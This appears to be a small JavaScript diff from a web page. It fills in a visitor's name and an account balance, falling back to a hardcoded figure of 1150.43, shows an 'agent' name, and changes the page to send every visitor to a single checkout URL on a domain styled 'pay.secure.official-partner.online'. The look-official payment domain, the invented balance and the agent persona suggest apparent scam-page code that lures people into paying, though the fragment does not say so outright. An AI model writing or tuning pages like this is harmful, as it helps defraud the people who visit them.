@@ -168,8 +168,8 @@ var agentNameEl=document.getElementById('agentName');
 var vars={nome:'',balance:'0.00'};
 
 var CHECKOUT_A='https://pay.secure.official-partner.online/';
-var CHECKOUT_B='https://pay.secure.official-partner.online/b';
-var CHECKOUT=Math.random()<.5?CHECKOUT_A:CHECKOUT_B;
+var CHECKOUT_B='https://pay.secure.official-partner.online/';
+var CHECKOUT=CHECKOUT_A;
 
 function fill(t){return t.replace(/\{\{(\w+)\}\}/g,function(_,k){
 if(k==='balance')return(curBal>0?curBal:parseFloat(balVal)||1150.43).toFixed(2);
